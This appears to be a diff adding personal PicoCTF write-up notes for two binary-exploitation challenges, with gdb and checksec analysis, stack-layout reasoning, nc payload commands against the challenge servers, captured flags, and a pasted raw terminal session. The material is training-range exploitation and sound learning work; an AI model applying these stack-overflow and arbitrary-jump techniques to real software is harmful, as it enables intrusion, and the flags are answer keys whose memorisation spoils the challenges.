@@ -1,0 +1,184 @@
+# PicoCTF Challenge Notes
+
+This document contains analysis, exploitation details, and flags for the binary exploitation challenges solved during this session.
+
+---
+
+## 1. Challenge: Picker-IV
+
+### Overview
+A binary exploitation challenge where the program takes a user-supplied hexadecimal address and jumps directly to that address.
+
+### Technical Analysis
+* **Binary Name:** `picker-IV`
+* **Vulnerability:** Arbitrary jump vulnerability via direct execution of a user-supplied address:
+  ```c
+  void (*foo)(void) = (void (*)())val;
+  foo();
+  ```
+* **Security Properties (checksec):**
+  * **PIE (Position Independent Executable):** Disabled (No PIE). Addresses are static.
+  * **NX (No-Execute):** Enabled.
+  * **Stack Canary:** None.
+
+### Exploitation Strategy
+1. Since **PIE** is disabled, function memory addresses do not change between executions.
+2. Inspect the binary symbols to find the address of the `win` function:
+   ```bash
+   gdb -batch -ex "info address win" ./picker-IV
+   # Symbol "win" is at 0x40129e
+   ```
+3. Input the hex address of `win` without the `0x` prefix.
+
+### Execution & Flag
+* **Payload:** `40129e`
+* **Command:**
+  ```bash
+  echo "40129e" | nc saturn.picoctf.net 59258
+  ```
+* **Flag:** `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}`
+
+---
+
+## 2. Challenge: Local Target
+
+### Overview
+A binary exploitation challenge where the goal is to modify a local variable on the stack to match a target condition that triggers the win path.
+
+### Technical Analysis
+* **Binary Name:** `local-target`
+* **Vulnerability:** Stack Buffer Overflow via unsafe `gets()` input.
+  * Buffer: `char input[16]`
+  * Target variable: `int num = 64`
+  * Win condition: `num == 65` (ASCII `'A'`)
+* **Security Properties (checksec):**
+  * **PIE:** Disabled.
+  * **Stack Canary:** None.
+  * **NX:** Enabled.
+
+### Memory & Stack Layout
+Analyzing the stack frame structure:
+* `input` starts at `rbp - 0x20` (32 bytes below Base Pointer).
+* `num` is located at `rbp - 0x8` (8 bytes below Base Pointer).
+* **Offset to target:** `32 - 8 = 24 bytes`.
+
+```
+Lower Addresses  <-- Stack grows down
+  | ...
+  | [ input ]    <-- rbp - 32 (16 bytes allocated)
+  | [ padding ]  <-- 8 bytes (inserted by compiler)
+  | [ num ]      <-- rbp - 8  (4 bytes: initialized to 64)
+  | ...
+Higher Addresses
+```
+
+### Exploitation Strategy
+1. Send **24 bytes** of dummy padding to completely fill `input` and the alignment padding.
+2. Send **`A`** (ASCII value 65 / `0x41`) as the 25th byte.
+3. The null byte appended automatically by `gets()` completes the little-endian integer representation for `65` at `-0x8(%rbp)`, fulfilling the win condition `num == 65`.
+
+### Execution & Flag
+* **Payload:** `24 * 'A' + 'A'` (Total 25 'A's)
+* **Command:**
+  ```bash
+  python3 -c "print('A'*24 + 'A')" | nc saturn.picoctf.net 59026
+  ```
+* **Flag:** `picoCTF{l0c4l5_1n_5c0p3_fee8ef05}`
+   ─(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ gdb ./pickerIV
+GNU gdb (Debian 17.2-1) 17.2
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+❌️ ./pickerIV: No such file or directory.
+(gdb) break main
+❌️ No symbol table is loaded.  Use the "file" command.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (main) pending.
+(gdb) run
+Starting program:  
+❌️ No executable file specified.
+Use the "file" or "exec-file" command.
+(gdb) win
+❌️ Ambiguous command "win": winheight, winwidth.
+(gdb) 
+❌️ Ambiguous command "win": winheight, winwidth.
+(gdb) eint
+❌️ Undefined command: "eint".  Try "help".
+(gdb) exit
+                                                                                                                                                                      
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ # Check security features
+checksec --file=./pickerIV
+
+# Disassemble main function immediately
+gdb -batch -ex "break main" -ex "disassemble main" ./pickerIV
+Error: The file './pickerIV' does not exist.
+
+./pickerIV: No such file or directory.
+No symbol table is loaded.  Use the "file" command.
+Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]
+No symbol table is loaded.  Use the "file" command.
+                                                                                                                                                                      
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ nc saturn.picoctf.net 59258
+Enter the address in hex to jump to, excluding '0x': echo "40129e" |
+You input 0xec
+Segfault triggered! Exiting.
+^C^C
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ echo "40129e" |nc saturn.picoctf.net 59258
+Enter the address in hex to jump to, excluding '0x': You input 0x40129e
+You won!
+picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ file local-target
+local-target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=63ee240a209d887ec451e996d844362e7e5c2078, for GNU/Linux 3.2.0, not stripped
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ file local-target.c
+local-target.c: C source, ASCII text
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$  python3 -c "print('A'*24 + 'A')" | ./local-target
+
+zsh: permission denied: ./local-target
+Exception ignored on flushing sys.stdout:
+BrokenPipeError: [Errno 32] Broken pipe
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$ chmod 777 local-target  
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$  python3 -c "print('A'*24 + 'A')" | ./local-target
+
+Enter a string: 
+num is 65
+You win!
+give flag
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Music/PICO-CTF/challenge]
+└─$  python3 -c "print('A'*24 + 'A')" | nc saturn.picoctf.net 59026
+
+Enter a string: 
+num is 65
+You win!
+picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
+                                                                                                 
